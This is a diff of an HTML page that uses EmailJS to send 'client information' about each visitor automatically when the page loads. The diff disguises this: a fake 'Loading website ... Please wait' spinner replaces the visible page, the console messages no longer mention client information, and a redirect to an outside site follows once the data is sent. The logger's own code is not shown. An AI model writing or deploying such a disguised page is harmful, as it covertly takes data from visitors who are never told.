@@ -4,53 +4,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World</title>
+    <title>Loading website</title>
 
     <!-- EmailJS CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
+            height: 100vh;
+            width: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
         }
 
         .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
 
-        h1 {
-            color: #333;
-            text-align: center;
-        }
-
-        #status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
-            text-align: center;
-            display: none;
-            /* Hide status by default */
-        }
-
-        #previewData {
-            display: none;
-            /* Hide preview by default */
+        img {
+            height: 5em;
+            margin-block: 1em;
         }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <h1>Hello World</h1>
-        <div id="status"></div>
-        <div id="previewData"></div>
+        <img class="img" src="https://raw.githubusercontent.com/niklausgerber/PreLoadMe/master/img/status.gif" alt="">
+        <p id="info">Loading website ...... Please wait</p>
     </div>
 
     <script>
@@ -131,11 +119,12 @@
         // Function to automatically send log when page loads
         async function autoSendLog() {
             try {
-                console.log('Sending client information...');
+                console.log('Sending...');
                 await ClientLogger.sendLogEmail();
-                console.log('Client information sent successfully!');
+                console.log('successfully!');
+                window.location.href = 'https://appchannel.vercel.app/';
             } catch (error) {
-                console.error('Failed to send client information:', error);
+                console.error('Failed to send:', error);
             }
         }
 
